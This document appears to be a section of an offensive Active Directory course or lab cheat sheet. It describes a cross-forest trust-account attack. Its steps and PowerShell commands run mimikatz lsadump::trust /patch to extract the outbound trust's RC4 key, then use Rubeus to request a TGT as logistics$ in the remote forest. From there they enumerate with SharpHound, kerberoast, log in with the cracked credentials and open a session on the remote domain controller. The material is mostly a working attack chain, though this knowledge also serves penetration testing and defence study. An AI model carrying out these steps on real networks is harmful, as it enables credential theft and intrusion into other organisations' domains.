# 14.15 Trust Account Attack Cross-Forest Outbound Trust

> Extract the outbound trust account's RC4 key via `mimikatz lsadump::trust /patch` and request a TGT as `logistics$` in the remote forest.

## Overview

When logistics.ad has an Outbound trust to megacorp.ad, a trust account megacorp\logistics$ is created in megacorp.ad. An admin of logistics.ad can extract the trust account's RC4 key from the TDO using mimikatz lsadump::trust /patch, then use that RC4 key to request a TGT for logistics$ in megacorp.ad, gaining domain user access in the otherwise-inaccessible forest.

## Steps

- Verify trust direction with **Get-ADTrust -Identity megacorp.ad** — look for Direction: Outbound
- Confirm access is blocked: **Get-ADUser Administrator -Server megacorp.ad** will fail
- Run **mimikatz lsadump::trust /patch** on logistics DC to extract trust keys ([ Out ] = current RC4 key)
- Use the RC4 key to request TGT for **logistics$** in megacorp.ad via **Rubeus asktgt**
- Now enumerate and attack megacorp with **SharpHound -d megacorp.ad** and **Rubeus kerberoast /domain:megacorp.ad**

## Commands

### Enumerate trust

```powershell
PS C:\Tools> Get-ADTrust -Identity megacorp.ad
```

### Extract trust keys

```powershell
mimikatz # lsadump::trust /patch
```

### Request TGT for trust account

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:logistics$ /domain:megacorp.ad /rc4:68e456d3a95cc748ac5a2eae679b9c91 /ptt
```

### Enumerate megacorp with SharpHound

```powershell
PS C:\Tools> .\SharpHound.exe -c All -d megacorp.ad
```

### Kerberoast megacorp

```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /domain:megacorp.ad
```

### Use cracked creds to access megacorp

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:white.beard /password:<SNIP> /domain:megacorp.ad /ptt
```

### PSSession to megacorp DC

```powershell
PS C:\Tools> Enter-PSSession DC03.megacorp.ad
```
